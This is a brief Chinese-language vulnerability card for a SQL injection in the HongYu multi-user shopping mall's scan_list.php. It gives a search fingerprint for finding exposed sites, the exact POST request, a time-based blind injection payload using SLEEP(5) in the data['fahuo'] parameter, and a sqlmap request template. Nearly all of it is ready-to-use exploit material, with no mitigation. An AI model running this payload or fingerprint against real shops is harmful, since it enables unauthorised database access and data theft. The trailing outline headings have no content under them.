# 鸿宇多用户商城scan_list存在SQL注入漏洞

- **系统**：鸿宇多用户商城　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="content=HongYuJD"`
- **请求**：`POST /scan_list.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 25`

**请求体 / payload**
```
data['fahuo']=(SELECT 2753 FROM (SELECT(SLEEP(5)))QkUH)&act=view

sqlmap
POST /scan_list.php HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
data['fahuo']=1&act=view

\[hydyhsc-scanlist-sqli.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 鸿宇多用户商城scan\_list存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 鸿宇多用户商城系统